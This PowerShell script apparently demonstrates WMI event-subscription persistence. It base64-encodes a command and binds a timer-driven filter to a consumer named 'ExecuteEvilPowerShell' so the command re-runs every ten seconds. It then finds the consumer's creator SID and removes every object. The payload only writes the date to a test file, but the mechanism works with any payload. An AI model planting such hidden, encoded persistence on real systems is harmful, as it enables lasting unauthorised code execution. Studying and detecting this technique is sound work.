﻿$payload = {
    Get-Date >> C:\test.txt
}
 
$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))
 
$command = "powershell.exe -EncodedCommand $encodedPayload"
 
$timer = Set-WmiInstance -Class __IntervalTimerInstruction -Arguments @{
    IntervalBetweenEvents = ([UInt32] 10000)
    SkipIfPassed = $False
    TimerId = 'PayloadTrigger'
}
 
$filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
    EventNamespace = 'root/cimv2'
    Name = 'TimerTrigger'
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTrigger'"
    QueryLanguage = 'WQL'
}
 
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
    Name = 'ExecuteEvilPowerShell'
    CommandLineTemplate = $command
}
 
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
    Filter = $filter
    Consumer = $consumer
}


$consumer = Get-CimInstance -Namespace root/subscription `
                            -ClassName CommandLineEventConsumer `
                            -Filter 'Name = "ExecuteEvilPowerShell"'


# .NET Class Constructor
$sid = [System.Security.Principal.SecurityIdentifier]::new($consumer.CreatorSID, 0)
$sid = New-Object -TypeName System.Security.Principal.SecurityIdentifier -ArgumentList $consumer.CreatorSID,0

$sid.Translate([System.Security.Principal.NTAccount]).Value


# Cleanup
$consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'ExecuteEvilPowerShell'"
$filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'TimerTrigger'"
$binding = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($consumer.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$timer = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = 'PayloadTrigger'"
 
Remove-WmiObject -InputObject $binding
Remove-WmiObject -InputObject $consumer
Remove-WmiObject -InputObject $filter
Remove-WmiObject -InputObject $timer
